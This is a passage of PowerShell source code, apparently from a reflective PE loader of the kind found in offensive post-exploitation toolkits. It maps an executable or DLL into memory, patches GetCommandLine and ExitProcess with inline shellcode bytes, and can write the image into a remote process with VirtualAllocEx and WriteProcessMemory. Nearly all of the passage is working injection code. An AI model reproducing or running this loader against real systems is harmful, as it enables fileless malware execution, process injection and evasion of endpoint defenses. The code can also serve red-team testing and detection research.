                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        # We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48    #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        # I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        # It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        # argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            # call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    # It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ########## FUNCTIONS ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                # which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero                #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero        #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $EffectivePEHandle = $PEHandle
        }
        
        [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
        if ($PEHandle -eq [IntPtr]::Zero)
        { 
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }        
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
        #Now that the PE is in memory, get more detailed information about it
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle) EndAddress: $(Get-Hex $PEEndAddress)"
        
        
        #Copy each section from the PE in to memory
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
        #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
        #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($RemoteLoading -eq $true)
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
        }
        else
        {
            Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
        }
        
        
        #Update the memory protection flags for all the memory just allocated
        if ($RemoteLoading -eq $false)
        {
            if ($NXCompatible -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }
        
        
        #If remote loading, copy the DLL in to remote process memory
        if ($RemoteLoading -eq $true)
        {
            [UInt32]$NumBytesWritten = 0
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }
        
        
        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
